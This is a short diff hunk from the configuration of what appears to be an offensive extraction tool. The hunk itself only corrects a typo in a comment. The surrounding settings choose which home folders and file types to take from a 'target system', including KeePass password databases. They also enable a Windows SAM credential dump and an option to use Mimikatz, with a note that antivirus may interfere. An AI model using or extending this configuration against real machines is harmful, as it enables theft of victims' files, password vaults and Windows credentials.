@@ -34,7 +34,7 @@ var user_subfolder1 = ["Documents"]                                             
 var user_subfolder2 = ["Downloads"]                                              // The second
 var user_subfolder3 = ["Desktop"]                                                // ...
 var user_subfolder4 = ["Pictures"]                                               // ...
-var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png", "kdbx", "db"]  // The filetypes to extract from previously specified folders in the home directory (Add .xlm, .bak, .zip, and any other you find interesting)
+var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png", "kdbx", "db"]  // The filetypes to extract from previously specified folders in the home directory (Add .xml, .bak, .zip, and any other you find interesting)
 // WINDOWS CREDENTIALS EXTRACTION (SAM DUMP)                                     // ---
 sam=true;                                                                        // Set to true to enable the extraction of Windows credentials dbs (Powershell must be run as Administrator for this to work [run_as_admin=true]). Might be problematic to execute if AntiVir is active on the target system.
 mimikatz=false;                                                                  // Use Mimikatz
